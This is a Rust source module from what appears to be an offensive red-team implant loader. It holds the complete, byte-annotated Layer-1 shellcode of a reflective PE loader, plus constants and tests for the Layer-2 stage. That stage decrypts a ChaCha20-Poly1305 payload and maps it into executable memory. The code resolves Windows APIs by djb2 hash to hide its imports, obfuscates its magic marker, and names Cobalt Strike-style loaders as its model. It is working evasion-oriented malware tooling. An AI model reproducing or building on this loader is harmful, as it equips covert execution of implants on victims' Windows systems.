//! On-target Layer-2 PIC shellcode (decrypt + reflective PE load) — the second
//! half of the reflective loader that runs as bare position-independent
//! shellcode on the engagement target.
//!
//! **STATUS: Layer 2 is live.** The Layer-2 bytes now come from the
//! `nyx-pic-loader` crate (`pic-loader/`): it is compiled to a raw
//! position-independent x86-64 binary whose `.text` (trimmed to start at the
//! `nyx_layer2_entry` export) is embedded here as [`LAYER2_CODE`] and appended
//! after the ciphertext by [`crate::wrap_payload`]. The previous
//! `LAYER2_PEB_WALK` byte blob (a non-functional placeholder with fabricated
//! offsets) was deleted; the real Layer-2 is the pic-loader build artifact
//! (spec §5.3, execution-validated by the VPS loader probe, spec §5.5).
//!
//! What this module holds:
//!
//!   * **Layer 1** ([`LAYER1_BOOTSTRAP`]) — the fixed prefix of every emitted
//!     stub: `call $+5; pop rax` self-location, the bounded NYX2 magic scan,
//!     the header parse (encrypted_len, nonce, ciphertext), the **bridge**
//!     that maps the Layer-1 register state onto the pic-loader Win64 entry
//!     ABI (`rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len`), and the `jmp rel32`
//!     at [`LAYER2_JMP_OFFSET`] whose displacement [`crate::wrap_payload`]
//!     patches to land on [`LAYER2_CODE`].
//!   * **Layer 2** ([`LAYER2_CODE`]) — the raw pic-loader bytes, embedded from
//!     `pic-loader/pic-loader.bin` and appended after the ciphertext so the
//!     NYX2 header stays within the 256-byte scan bound.
//!   * **The Layer-2 contract constants** — the djb2 hashes and Win32
//!     constants below (`HASH_*`, `MEM_COMMIT_RESERVE`,
//!     `PAGE_EXECUTE_READWRITE`, `DLL_PROCESS_ATTACH`, `KEY_LEN`,
//!     `KEY_PATCH_OFFSET`) document the register/key layout the pic-loader
//!     honours, and are pinned by host-side tests so the contract cannot
//!     silently drift.
//!   * **`find_magic_offset`** — the pure host-side model of the Layer-1 scan
//!     loop, extracted for unit testing without a Windows target.
//!
//! ## Why inline crypto (spec §5.3)
//!
//! The [`chacha20poly1305`](https://docs.rs/chacha20poly1305) crate requires
//! `alloc` and pulls in the Rust panic runtime — neither exists when the stub
//! is executing as bare shellcode with no loader, no heap, and no `std`. The
//! pic-loader Layer-2 therefore carries an inline ChaCha20-Poly1305 port
//! (~600 bytes of x86-64; the standard approach every reflective loader —
//! Cobalt Strike, Brute Ratel, Nighthawk, rdll-rs, airborne — takes).
//!
//! ## Validation split
//!
//! Layer 1 cannot be *execution*-tested on the macOS dev host (no Windows
//! process, no PEB, no `gs:[0x60]`); the scan algorithm is extracted into the
//! pure [`find_magic_offset`] function so the exact loop the stub runs is
//! exercised host-side. Execution validation of the complete loader (Layer 1
//! plus Layer 2) is the
//! job of the VPS loader probe (spec §5.5; see scripts/loader_probe.ps1): the
//! wrapped blob is injected into a dedicated
//! short-lived test process via a harness DLL, and the harness reports
//! OK/FAIL per stage. Host-side tests
//! ([`crate::stub_layout`], [`crate::payload_format`],
//! [`crate::roundtrip_decrypt`]) cover what can be
//! verified without a target: the Layer-1 byte layout, the scan algorithm,
//! the payload header format, and the encrypt/decrypt roundtrip.
//!
//! ## djb2 hash constants
//!
//! The PEB walk matches module and API names by their djb2 hash so no plaintext
//! strings appear in the shellcode. The hash is the same one
//! [`crate::peb_walk::djb2`] computes (case-insensitive, seed 5381, mul 33).
//! Values below were computed from the exact ASCII names; the assertions in
//! [`on_target::tests`] pin them so a hash-function change is caught.

/// djb2 hash of `"kernel32.dll"` (case-insensitive, seed 5381, ×33 per byte).
///
/// Computed by:
/// ```text
/// h = 5381
/// for c in b"kernel32.dll" (lowercased): h = h*33 + c
/// → 0x7040EE75
/// ```
pub const HASH_KERNEL32_DLL: u32 = 0x7040EE75;

/// djb2 hash of `"VirtualAlloc"` → `0x58DACBD7`.
pub const HASH_VIRTUAL_ALLOC: u32 = 0x58DACBD7;

/// djb2 hash of `"LoadLibraryA"` → `0x0666395B`.
pub const HASH_LOAD_LIBRARY_A: u32 = 0x0666395B;

/// djb2 hash of `"GetProcAddress"` → `0x82172F7F`.
pub const HASH_GET_PROC_ADDRESS: u32 = 0x82172F7F;

/// `MEM_COMMIT | MEM_RESERVE` — the allocation type the stub passes to
/// `VirtualAlloc`. Matches `winnt.h` (`MEM_COMMIT = 0x1000`,
/// `MEM_RESERVE = 0x2000`).
pub const MEM_COMMIT_RESERVE: u32 = 0x3000;

/// `PAGE_EXECUTE_READWRITE` — the protection the decrypted PE image is mapped
/// with. After sections + relocs + IAT are fixed up a real loader would
/// `VirtualProtect` each section to its intended permission; the reflective
/// loader keeps RWX for simplicity (the implant applies its own per-section
/// protections later if it needs to).
pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;

/// `DLL_PROCESS_ATTACH` — the `reason` argument the stub passes to `DllMain`.
pub const DLL_PROCESS_ATTACH: u32 = 1;

/// Maximum number of bytes the Layer-1 scan walks forward from the self-location
/// address looking for the NYX2 magic (spec §5.2 step 2: "bound rax+256").
/// The magic always sits immediately after the stub code, so this bound is a
/// safety cap against a corrupt/tampered blob, not a tight limit.
pub const MAGIC_SCAN_BOUND: usize = 256;

/// Number of bytes in the baked-in ChaCha20 key. The stub reads the key from a
/// fixed offset within itself (see [`KEY_PATCH_OFFSET`]); the nonce is read
/// from the NYX2 header at runtime.
pub const KEY_LEN: usize = 32;

/// Offset within the full emitted stub (as returned by
/// [`crate::generate_loader_stub`]) where the 32-byte ChaCha20 key is patched
/// in. Layer 1 ends and the key slot begins here; the pic-loader entry reads
/// the key via the bridge (`lea rcx, [rbx-0x20]`, i.e. 32 bytes before the
/// NYX2 header, which is exactly `KEY_PATCH_OFFSET + KEY_LEN`).
///
/// This is the offset from the *start* of the stub blob. It sits after the
/// Layer-1 prologue + scan + header-parse + bridge, immediately before the
/// NYX2 header that [`crate::wrap_payload`] appends.
pub const KEY_PATCH_OFFSET: usize = LAYER1_BOOTSTRAP.len();

/// Layer 1: self-location + NYX2 scan + header parse + bridge + jmp.
///
/// This byte slice is the fixed prefix of every emitted stub. It:
///   - self-locates via `call $+5; pop rax`,
///   - scans forward (bounded at `rax + 256`) for the `NYX2` magic,
///   - parses `encrypted_len` and the pointers to nonce + ciphertext out of
///     the header,
///   - runs the **bridge**: converts the Layer-1 register state (rax=enc_len,
///     rbx=&header, rsi=&nonce, rdi=&ct) into the pic-loader Win64 entry ABI
///     (`rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len`),
///   - jumps into the Layer-2 decrypt-and-reflect routine ([`LAYER2_CODE`])
///     via the `jmp rel32` at [`LAYER2_JMP_OFFSET`], whose displacement
///     [`crate::wrap_payload`] patches.
///
/// The disassembly below is the source of truth for these bytes; every byte is
/// annotated. Displacements are computed against the offset column.
///
/// ```asm
/// ; ── self-locate (6 bytes) ─────────────────────────────────────────────
/// 0000: E8 00 00 00 00         call  $+5              ; push &0x0005
/// 0005: 58                     pop   rax              ; rax = stub_base + 5
///
/// ; ── scan forward for NYX2 magic, bound rax+256 ────────────────────────
/// 0006: 48 8D 90 00 01 00 00   lea   rdx, [rax+0x100] ; rdx = scan end (exclusive)
/// 000D: 48 89 C1               mov   rcx, rax         ; rcx = scan cursor
/// ; The magic is NEVER encoded as a contiguous inline immediate — that would
/// ; make the scanner self-match its own `cmp` operand. Instead we recover it
/// ; in eax from two halves (NYX2_MAGIC ^ MAGIC_XOR_KEY = 0x68020314), so no
/// ; 4-byte window of the stub equals the magic.
/// 0010: B8 14 03 02 68         mov   eax, 0x68020314  ; obfuscated magic
/// 0015: 35 5A 5A 5A 5A         xor   eax, 0x5A5A5A5A  ; eax = 0x3258594E ("NYX2")
/// ; scan_loop (0x1A):
/// 001A: 39 01                  cmp   dword [rcx], eax ; compare against recovered magic
/// 001C: 74 09                  je    found_magic (0x27)
/// 001E: 48 FF C1               inc   rcx
/// 0021: 48 39 D1               cmp   rcx, rdx
/// 0024: 75 F4                  jne   scan_loop (0x1A)
/// 0026: C3                     ret                      ; magic missing → bail silently
///
/// ; ── found_magic (0x27): rcx = &NYX2 header ────────────────────────────
/// 0027: 8B 41 04               mov   eax, [rcx+4]     ; eax = encrypted_len (u32 LE)
/// 002A: 48 8D 71 08            lea   rsi, [rcx+8]     ; rsi = &nonce (12 bytes)
/// 002E: 48 8D 79 14            lea   rdi, [rcx+0x14]  ; rdi = &ciphertext||tag
/// 0032: 48 89 CB               mov   rbx, rcx         ; rbx = header base (preserved)
///
/// ; ── bridge: pic-loader Win64 entry ABI (13 bytes) ─────────────────────
/// ; Layer-1 state: rax=enc_len, rbx=&header, rsi=&nonce, rdi=&ct.
/// ; The key slot sits 0x20 bytes BEFORE the header ([LAYER1][key][header]),
/// ; so &key = rbx - 0x20. pic-loader entry is extern "C"
/// ; fn(key, nonce, ct, ct_len) → rcx, rdx, r8, r9.
/// 0035: 48 8D 4B E0            lea   rcx, [rbx-0x20]  ; rcx = &key (32B before header)
/// 0039: 48 89 F2               mov   rdx, rsi         ; rdx = &nonce
/// 003C: 49 89 F8               mov   r8, rdi          ; r8 = &ciphertext||tag
/// 003F: 49 89 C1               mov   r9, rax          ; r9 = ct_len (excl. tag)
///
/// ; ── jmp into Layer 2 (displacement patched by wrap_payload) ───────────
/// 0042: E9 xx xx xx xx         jmp   rel32  →  LAYER2_CODE + LAYER2_ENTRY_OFFSET
/// ```
///
/// Register ABI on entry to Layer 2 (the pic-loader `extern "C"` signature):
/// | register | arg          | value                                          |
/// |----------|--------------|------------------------------------------------|
/// | `rcx`    | `key`        | `&32-byte key slot` (immediately before header) |
/// | `rdx`    | `nonce`      | `&nonce` (12 bytes)                            |
/// | `r8`     | `ct`         | `&ciphertext \|\| tag`                          |
/// | `r9`     | `ct_len`     | ciphertext length, excl. 16-byte tag           |
pub const LAYER1_BOOTSTRAP: &[u8] = &[
    // ── self-locate ──────────────────────────────────────────────────────
    0xE8, 0x00, 0x00, 0x00, 0x00, // 0000: call $+5
    0x58, // 0005: pop rax
    // ── scan bound + cursor ──────────────────────────────────────────────
    0x48, 0x8D, 0x90, 0x00, 0x01, 0x00, 0x00, // 0006: lea rdx, [rax+0x100]
    0x48, 0x89, 0xC1, // 000D: mov rcx, rax
    // ── recover magic in eax via XOR (avoid self-matching the scanner) ───
    // mov eax, 0x68020314  (= NYX2_MAGIC ^ MAGIC_XOR_KEY)
    0xB8, 0x14, 0x03, 0x02, 0x68, // 0010: mov eax, 0x68020314
    // xor eax, 0x5A5A5A5A  → eax = 0x3258594E ("NYX2")
    0x35, 0x5A, 0x5A, 0x5A, 0x5A, // 0015: xor eax, 0x5A5A5A5A
    // ── scan_loop (0x1A) ─────────────────────────────────────────────────
    0x39, 0x01, // 001A: cmp dword [rcx], eax
    0x74, 0x09, // 001C: je found_magic (0x27)
    0x48, 0xFF, 0xC1, // 001E: inc rcx
    0x48, 0x39, 0xD1, // 0021: cmp rcx, rdx
    0x75, 0xF4, // 0024: jne scan_loop (0x1A)
    0xC3, // 0026: ret (magic not found — bail silently)
    // ── found_magic (0x27): parse header ─────────────────────────────────
    0x8B, 0x41, 0x04, // 0027: mov eax, [rcx+4]    ; encrypted_len
    0x48, 0x8D, 0x71, 0x08, // 002A: lea rsi, [rcx+8]    ; &nonce
    0x48, 0x8D, 0x79, 0x14, // 002E: lea rdi, [rcx+0x14] ; &ciphertext||tag
    0x48, 0x89, 0xCB, // 0032: mov rbx, rcx         ; header base preserved
    // ── bridge (0x35): pic-loader Win64 entry ABI ────────────────────────
    // Layer-1 state: rax=enc_len, rbx=&header, rsi=&nonce, rdi=&ct.
    // Key slot is 0x20 bytes before the header ([LAYER1][key][header]).
    0x48, 0x8D, 0x4B, 0xE0, // 0035: lea rcx, [rbx-0x20] ; rcx = &key
    0x48, 0x89, 0xF2, // 0039: mov rdx, rsi            ; rdx = &nonce
    0x49, 0x89, 0xF8, // 003C: mov r8, rdi             ; r8  = &ciphertext||tag
    0x49, 0x89, 0xC1, // 003F: mov r9, rax             ; r9  = ct_len
    // ── jmp into Layer-2 (displacement patched by wrap_payload) ──────────
    // 0042: E9 xx xx xx xx  →  jmp rel32 to LAYER2_CODE + LAYER2_ENTRY_OFFSET
    // The 4-byte displacement is filled in by `crate::wrap_payload` once the
    // ciphertext length is known (LAYER2 sits AFTER the ciphertext); the
    // placeholder bytes below are the opcode plus a zero displacement that
    // gets overwritten.
    0xE9, 0x00, 0x00, 0x00, 0x00, // 0042: jmp rel32 (patched)
];

/// Offset within [`LAYER1_BOOTSTRAP`] of the `jmp rel32` that transfers to the
/// Layer-2 code. The 4-byte displacement (at `+ 1`) is patched by
/// [`crate::wrap_payload`] to land at `LAYER2_CODE + LAYER2_ENTRY_OFFSET`
/// (the first byte of the Layer-2 blob, which sits after the ciphertext in
/// the wrapped payload). The `jmp` is the last instruction of Layer 1, so
/// `LAYER2_JMP_OFFSET + 5 == LAYER1_BOOTSTRAP.len()` (pinned by test).
pub const LAYER2_JMP_OFFSET: usize = 0x42;

/// Offset within [`LAYER2_CODE`] of the pic-loader entry point
/// (`nyx_layer2_entry`). The `pic-loader/pic-loader.bin` build artifact is
/// trimmed to start at the entry function (the raw `.text` of the cdylib with
/// everything before the first `nyx_layer2_entry` byte stripped), so this is
/// `0`. Keep it a named constant so a future pipeline that ships the full
/// `.text` needs only this one-line change, not an emitter rewrite.
pub const LAYER2_ENTRY_OFFSET: usize = 0;

/// Raw Layer-2 PIC shellcode (decrypt + reflective PE load), embedded from
/// the `nyx-pic-loader` build artifact at build time.
///
/// The file is produced by the pic-loader build pipeline (`crates/nyx-loader/
/// pic-loader/`): the `nyx-pic-loader` crate compiles to a bare PIC x86-64
/// binary (no `std`, no heap, panic=abort) and its `.text` section, trimmed
/// to start at the exported `nyx_layer2_entry` function, is written to
/// `pic-loader/pic-loader.bin`. `wrap_payload` appends these bytes AFTER the
/// ciphertext so the NYX2 header stays within the Layer-1 256-byte scan bound
/// (spec §5.2), and patches the Layer-1 `jmp rel32` to reach the entry.
///
/// The entry follows the Win64 calling convention
/// (`extern "C" fn(key: *const u8, nonce: *const u8, ct: *const u8,
/// ct_len: usize) -> usize`): `rcx=&key, rdx=&nonce, r8=&ct, r9=ct_len` — the
/// exact ABI the Layer-1 bridge sets up. Returns `0` on success, `usize::MAX`
/// on tag mismatch, small integers on PEB/alloc/PE-parse failures.
pub const LAYER2_CODE: &[u8] = include_bytes!("../pic-loader/pic-loader.bin");

/// The XOR key used to obfuscate the NYX2 magic in the Layer-1 scanner so no
/// 4-byte window of the stub self-matches the magic. `NYX2_MAGIC ^
/// MAGIC_XOR_KEY == 0x68020314` is the immediate the scanner loads, then XORs
/// back with this key to recover the real magic in `eax`.
pub const MAGIC_XOR_KEY: u32 = 0x5A5A5A5A;

/// Pure host-side model of the Layer-1 NYX2 magic scan (spec §5.2 step 2).
///
/// This is the testable equivalent of the scan loop at offset `0x10` in
/// [`LAYER1_BOOTSTRAP`]: starting at `scan_start`, walk forward byte-by-byte
/// looking for the 4-byte `NYX2` magic (little-endian `0x3258594E`), bounded
/// at `scan_start + bound`. Returns the absolute offset of the magic within
/// `blob`, or `None` if it is not found within the bound.
///
/// Keeping the scan as a separate pure function means the macOS host tests can
/// exercise exactly the algorithm the PIC stub runs on-target, without needing
/// a Windows process or an emulator.
pub fn find_magic_offset(blob: &[u8], scan_start: usize, bound: usize) -> Option<usize> {
    let end = scan_start.checked_add(bound)?.min(blob.len());
    // A dword read needs 4 bytes; the magic is 4 bytes wide, so the last
    // candidate start is end - 3. Anything later cannot hold a full magic.
    if end < 4 {
        return None;
    }
    let last = end - 4;
    let mut cur = scan_start;
    while cur <= last {
        let dword = u32::from_le_bytes([blob[cur], blob[cur + 1], blob[cur + 2], blob[cur + 3]]);
        if dword == crate::stub::NYX2_MAGIC {
            return Some(cur);
        }
        cur += 1;
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::peb_walk::djb2;

    /// Pin the djb2 hash constants the PIC stub bakes in. If the hash function
    /// ever changes, the on-target PEB walk silently fails to resolve every
    /// API, so these assertions are the canary that catches a drift before the
    /// blob ever reaches the VPS probe.
    #[test]
    fn hash_constants_match_djb2_of_names() {
        assert_eq!(
            djb2(b"kernel32.dll"),
            HASH_KERNEL32_DLL,
            "kernel32.dll hash"
        );
        assert_eq!(
            djb2(b"VirtualAlloc"),
            HASH_VIRTUAL_ALLOC,
            "VirtualAlloc hash"
        );
        assert_eq!(
            djb2(b"LoadLibraryA"),
            HASH_LOAD_LIBRARY_A,
            "LoadLibraryA hash"
        );
        assert_eq!(
            djb2(b"GetProcAddress"),
            HASH_GET_PROC_ADDRESS,
            "GetProcAddress hash"
        );
        // The four values must be distinct (a collision would mean the PEB walk
        // could mis-resolve one API for another).
        let mut seen = vec![
            HASH_KERNEL32_DLL,
            HASH_VIRTUAL_ALLOC,
            HASH_LOAD_LIBRARY_A,
            HASH_GET_PROC_ADDRESS,
        ];
        seen.sort_unstable();
        seen.dedup();
        assert_eq!(seen.len(), 4, "bootstrap API hashes must not collide");
    }

    /// Verify the documented decimal values (the comments above each constant
    /// state them; pinning both hex and decimal catches a copy-paste error in
    /// either representation).
    #[test]
    fn hash_constant_values_are_documented_correctly() {
        assert_eq!(HASH_KERNEL32_DLL, 0x7040EE75);
        assert_eq!(HASH_VIRTUAL_ALLOC, 0x58DACBD7);
        assert_eq!(HASH_LOAD_LIBRARY_A, 0x0666395B);
        assert_eq!(HASH_GET_PROC_ADDRESS, 0x82172F7F);
    }

    /// `find_magic_offset` mirrors the on-target scan loop exactly. Put the
    /// magic at a known offset and confirm the scan lands on it.
    #[test]
    fn find_magic_offset_locates_embedded_magic() {
        let mut blob = vec![0x11u8; 64];
        // Place NYX2 at offset 40 (scan_start = 5, well within bound).
        blob[40..44].copy_from_slice(&crate::stub::NYX2_MAGIC.to_le_bytes());
        let off = find_magic_offset(&blob, 5, MAGIC_SCAN_BOUND).expect("magic must be found");
        assert_eq!(off, 40);
    }

    /// The scan must respect its bound: a magic just past the bound is not
    /// found (returns `None`), matching the stub's `ret` on exhaustion.
    #[test]
    fn find_magic_offset_respects_bound() {
        let mut blob = vec![0u8; 512];
        // Magic at offset 300, but bound is 256 → must not be found.
        blob[300..304].copy_from_slice(&crate::stub::NYX2_MAGIC.to_le_bytes());
        assert!(find_magic_offset(&blob, 0, MAGIC_SCAN_BOUND).is_none());
    }

    /// The scan returns `None` cleanly when the magic is absent, rather than
    /// running off the end of the buffer (the on-target equivalent is the
    /// `cmp rcx, rdx; jne` bound check before the `ret`).
    #[test]
    fn find_magic_offset_returns_none_when_absent() {
        let blob = vec![0xAAu8; 128];
        assert!(find_magic_offset(&blob, 0, MAGIC_SCAN_BOUND).is_none());
    }

    /// The magic found at the very first scanned byte (offset == scan_start)
    /// is reported with offset == scan_start, not scan_start+1.
    #[test]
    fn find_magic_offset_handles_magic_at_start() {
        let mut blob = Vec::with_capacity(16);
        blob.extend_from_slice(&crate::stub::NYX2_MAGIC.to_le_bytes());
        blob.extend_from_slice(&[0u8; 12]);
        let off = find_magic_offset(&blob, 0, MAGIC_SCAN_BOUND).unwrap();
        assert_eq!(off, 0);
    }

    /// No 4-byte window of the Layer-1 stub may equal the NYX2 magic. If it
    /// did, the on-target scanner would self-match its own code before
    /// reaching the real header. The stub recovers the magic in `eax` via XOR
    /// (see [`MAGIC_XOR_KEY`]) precisely to avoid this; this test is the
    /// canary that a future edit doesn't reintroduce a plaintext inline
    /// immediate.
    #[test]
    fn layer1_stub_does_not_embed_magic_as_contiguous_bytes() {
        let magic_bytes = crate::stub::NYX2_MAGIC.to_le_bytes();
        // Scan every 4-byte window of LAYER1_BOOTSTRAP for the magic.
        for w in LAYER1_BOOTSTRAP.windows(4) {
            assert_ne!(
                w,
                &magic_bytes[..],
                "LAYER1_BOOTSTRAP contains the NYX2 magic as a contiguous 4-byte window at \
                 offset {}, which would make the scanner self-match; use the XOR-recover \
                 idiom (mov eax, obf; xor eax, key) instead",
                LAYER1_BOOTSTRAP
                    .windows(4)
                    .position(|x| x == w)
                    .unwrap_or(usize::MAX),
            );
        }
        // The XOR-recover immediates themselves must NOT spell the magic.
        let obf = crate::stub::NYX2_MAGIC ^ MAGIC_XOR_KEY;
        assert_ne!(obf, crate::stub::NYX2_MAGIC);
        assert_ne!(MAGIC_XOR_KEY, crate::stub::NYX2_MAGIC);
        // And sanity-check the obfuscation round-trips.
        assert_eq!(obf ^ MAGIC_XOR_KEY, crate::stub::NYX2_MAGIC);
    }
}
